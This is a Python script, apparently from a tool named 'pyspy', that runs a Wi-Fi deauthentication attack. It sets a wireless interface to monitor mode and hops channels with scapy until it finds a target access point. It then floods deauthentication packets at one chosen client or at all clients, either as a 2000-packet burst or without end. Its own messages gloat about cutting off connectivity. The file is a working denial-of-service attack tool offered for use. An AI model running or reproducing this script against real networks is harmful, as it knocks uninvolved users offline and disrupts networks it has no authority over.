# Imports for libraries
from pyspy.attacks import deauth
from pyspy.callbacks import get_hostnames, getDF
from pyspy.config import interface, get_deauth_args, get_interfaces, banner
from pyspy.config import print_warning, print_update, print_good
from threading import Thread
from scapy import *
from time import sleep
from scapy.all import *


def main(arguments):
    # Checks if a channel interface is passed
    # If it is set the interface to that adapter
    # If not get the interface automatically
    if arguments.interface:
        my_interface = interface(arguments.interface)
    else:
        my_interface = interface(get_interfaces()[1])
    print_update(f"[+] The interface used for deauthentication is: {my_interface}")
    # Put the interface into monitor mode
    my_interface.set_monitor_mode()
    print_update(f"[+] {my_interface} has been set into monitor mode")
    # Gets the empty dataframe from the callback
    networks = getDF()
    # While the AP mac address isn't present keep searching
    print_update(f"[+] Beginning search for {arguments.bssid}")
    while(arguments.bssid not in networks.index):
        # Sniff 50 pcakets at a time
        sniff(prn=get_hostnames, iface=my_interface.name, count = 50)
        # Get the dataframe created by the call back
        networks = getDF()
        # increase the channel
        my_interface.channel += 1
        # Used to keep the channel below 14
        my_interface.channel = my_interface.channel %14
    
    # Once the AP mac address is found get the channel
    channel_for_deauth = networks.loc[arguments.bssid, "Channel"]
    # Set the antena channel to that of the AP in order to deauth
    my_interface.change_channel(channel_for_deauth)
    # Check if a destination mac was provided
    # If it was only deauth that device
    # Else disconnect all the things
    if arguments.destination_mac:
        if arguments.forever:
            print_update(f"[+] Sending Packets Forever!!! Screw the WIFI connectivity to: {networks.loc[arguments.bssid, 'SSID']}!!!")
            deauth(my_interface.name, 
                    arguments.bssid, 
                    arguments.destination_mac, 
                    forever=True)
        else:
            print_update(f"[+] Sending 2000 Packets!!! Screw the WIFI connectivity to: {networks.loc[arguments.bssid, 'SSID']}!!!")
            deauth(my_interface.name, 
                    arguments.bssid, 
                    arguments.destination_mac)
    else:
        if arguments.forever:
            print_update(f"[+] Sending Packets Forever!!! Screw the WIFI connectivity to all the things!!!")
            deauth(my_interface.name, 
                    arguments.bssid, 
                    forever=True)
        else:
            print_update(f"[+] Sending 2000 Packets!!! Screw the WIFI connectivity to all the things!!!")
            deauth(my_interface.name, 
                    arguments.bssid)

# Start of the program
if __name__ == '__main__':
    # Gets arguments from the cli
    cli_arguments = get_deauth_args()
    if not cli_arguments.quiet:
        banner()
        cprint("[+] Begining deauthentication initialization sequence")
    main(cli_arguments)
        